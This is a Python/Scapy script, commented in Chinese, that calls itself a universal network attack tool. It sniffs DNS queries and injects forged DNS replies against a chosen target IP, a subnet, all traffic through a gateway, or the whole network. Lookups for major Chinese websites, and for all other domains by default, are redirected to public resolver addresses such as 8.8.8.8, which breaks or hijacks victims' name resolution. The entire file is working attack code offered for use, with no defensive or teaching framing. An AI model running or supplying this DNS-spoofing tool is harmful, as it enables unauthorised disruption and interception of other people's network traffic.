#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单通用网络攻击工具
可以针对任何计算机进行精准攻击或全网关攻击
"""

import threading
import time
from scapy.all import *

class SimpleUniversalAttack:
    def __init__(self):
        self.attack_running = False
        self.spoof_count = 0
        
        # 国内平台重定向规则
        self.china_platforms = {
            # 电视平台
            "iqiyi.com": "1.1.1.1", "youku.com": "8.8.8.8", "bilibili.com": "8.8.8.8",
            "douyin.com": "208.67.222.222", "kuaishou.com": "1.1.1.1",
            
            # 搜索引擎
            "baidu.com": "8.8.8.8", "sogou.com": "1.1.1.1", "so.com": "208.67.222.222",
            
            # 传媒平台
            "sina.com.cn": "8.8.8.8", "sohu.com": "1.1.1.1", "163.com": "208.67.222.222",
            "qq.com": "8.8.8.8", "ifeng.com": "1.1.1.1",
            
            # 电商平台
            "taobao.com": "8.8.8.8", "jd.com": "208.67.222.222", "pinduoduo.com": "8.8.8.8",
            
            # 社交平台
            "weibo.com": "1.1.1.1", "zhihu.com": "208.67.222.222", "toutiao.com": "8.8.8.8",
        }
    
    def single_target_mode(self, target_ip):
        """单目标攻击模式"""
        print(f"🎯 单目标攻击模式启动 (目标: {target_ip})")
        
        def single_spoof(pkt):
            if pkt.haslayer(DNSQR) and pkt.haslayer(IP):
                if pkt[IP].src == target_ip:  # 只处理目标IP的DNS查询
                    domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    
                    # 智能重定向
                    redirect_ip = "8.8.8.8"
                    for platform, ip in self.china_platforms.items():
                        if platform in domain:
                            redirect_ip = ip
                            break
                    
                    # 创建DNS响应
                    spoofed_pkt = IP(dst=target_ip, src=pkt[IP].dst)/\
                                 UDP(dport=pkt[UDP].sport, sport=53)/\
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                             ttl=600, rdata=redirect_ip))
                    
                    send(spoofed_pkt, verbose=False)
                    
                    self.spoof_count += 1
                    print(f"🎯 [{self.spoof_count}] 单目标: {domain} -> {redirect_ip}")
        
        try:
            sniff(filter=f"udp port 53 and host {target_ip}", prn=single_spoof, store=0)
        except Exception as e:
            print(f"❌ 单目标攻击失败: {e}")
    
    def subnet_mode(self, subnet):
        """子网攻击模式"""
        print(f"🌐 子网攻击模式启动 (子网: {subnet}.x)")
        
        def subnet_spoof(pkt):
            if pkt.haslayer(DNSQR) and pkt.haslayer(IP):
                if pkt[IP].src.startswith(subnet + "."):  # 处理子网内所有IP
                    domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    
                    # 智能重定向
                    redirect_ip = "8.8.8.8"
                    for platform, ip in self.china_platforms.items():
                        if platform in domain:
                            redirect_ip = ip
                            break
                    
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                 UDP(dport=pkt[UDP].sport, sport=53)/\
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                             ttl=600, rdata=redirect_ip))
                    
                    send(spoofed_pkt, verbose=False)
                    
                    self.spoof_count += 1
                    print(f"🌐 [{self.spoof_count}] 子网: [{pkt[IP].src}] {domain} -> {redirect_ip}")
        
        try:
            # 监听子网DNS流量
            sniff(filter="udp port 53", prn=subnet_spoof, store=0)
        except Exception as e:
            print(f"❌ 子网攻击失败: {e}")
    
    def gateway_mode(self):
        """网关攻击模式"""
        print("🚪 网关攻击模式启动 (影响所有通过网关的设备)")
        
        def gateway_spoof(pkt):
            if pkt.haslayer(DNSQR):
                domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # 智能重定向所有DNS查询
                redirect_ip = "8.8.8.8"
                for platform, ip in self.china_platforms.items():
                    if platform in domain:
                        redirect_ip = ip
                        break
                
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                             UDP(dport=pkt[UDP].sport, sport=53)/\
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                         ttl=600, rdata=redirect_ip))
                
                send(spoofed_pkt, verbose=False)
                
                self.spoof_count += 1
                print(f"🚪 [{self.spoof_count}] 网关: {domain} -> {redirect_ip}")
        
        try:
            # 监听所有DNS流量
            sniff(filter="udp port 53", prn=gateway_spoof, store=0)
        except Exception as e:
            print(f"❌ 网关攻击失败: {e}")
    
    def network_wide_mode(self):
        """全网攻击模式"""
        print("🌍 全网攻击模式启动 (影响整个网络)")
        
        def network_spoof(pkt):
            if pkt.haslayer(DNSQR):
                domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # 智能重定向
                redirect_ip = "8.8.8.8"
                for platform, ip in self.china_platforms.items():
                    if platform in domain:
                        redirect_ip = ip
                        break
                
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                             UDP(dport=pkt[UDP].sport, sport=53)/\
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                         ttl=600, rdata=redirect_ip))
                
                send(spoofed_pkt, verbose=False)
                
                self.spoof_count += 1
                
                # 显示源IP信息
                src_ip = pkt[IP].src
                if src_ip.startswith("10.30.58"):
                    print(f"🎯 [{self.spoof_count}] 目标网段: [{src_ip}] {domain} -> {redirect_ip}")
                else:
                    print(f"🌍 [{self.spoof_count}] 全网: [{src_ip}] {domain} -> {redirect_ip}")
        
        try:
            # 监听所有DNS流量
            sniff(filter="udp port 53", prn=network_spoof, store=0)
        except Exception as e:
            print(f"❌ 全网攻击失败: {e}")
    
    def run_simple_attack(self):
        """运行简单攻击"""
        print("=" * 70)
        print("          简单通用网络攻击工具")
        print("=" * 70)
        
        print("\n🎯 攻击模式选择:")
        print("1. 单目标攻击 (精准打击特定计算机)")
        print("2. 子网攻击 (影响整个子网段)")
        print("3. 网关攻击 (影响通过网关的所有设备)")
        print("4. 全网攻击 (影响整个网络)")
        
        mode = input("\n请选择攻击模式 (1-4): ").strip()
        
        self.attack_running = True
        
        if mode == "1":
            target_ip = input("请输入目标IP地址: ").strip()
            self.single_target_mode(target_ip)
        
        elif mode == "2":
            subnet = input("请输入子网段 (如: 10.30.58): ").strip()
            self.subnet_mode(subnet)
        
        elif mode == "3":
            self.gateway_mode()
        
        elif mode == "4":
            self.network_wide_mode()
        
        else:
            print("❌ 无效选择，使用默认全网攻击模式")
            self.network_wide_mode()
    
    def stop_attack(self):
        """停止攻击"""
        self.attack_running = False
        print("\n🛑 停止攻击")

def main():
    """主函数"""
    attack = SimpleUniversalAttack()
    
    try:
        attack.run_simple_attack()
    except KeyboardInterrupt:
        attack.stop_attack()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()